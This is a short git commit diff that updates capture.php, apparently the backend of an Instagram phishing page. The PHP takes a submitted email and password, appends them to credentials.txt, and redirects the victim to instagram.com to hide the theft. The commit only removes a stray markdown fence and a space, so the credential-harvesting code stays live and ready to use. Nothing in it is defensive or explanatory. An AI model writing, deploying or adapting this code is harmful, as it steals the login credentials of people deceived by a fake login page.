6119fb28ba13efebd98c9f8b804a5b736185e0e5
Levon2000 <studyhard1588@gmail.com>
2025-03-18 23:26:16 +0400

    Update capture.php

--- capture.php
+++ capture.php
@@ -1,7 +1,4 @@
-```php
-
-
 <?php$email = $_POST['email'];$password = $_POST['password'];
-file_put_contents('credentials.txt',$email. ':'.$password. PHP_EOL, FILE_APPEND);
+file_put_contents('credentials.txt',$email.':'.$password. PHP_EOL, FILE_APPEND);
 header('Location: https://instagram.com/');
 exit;?>
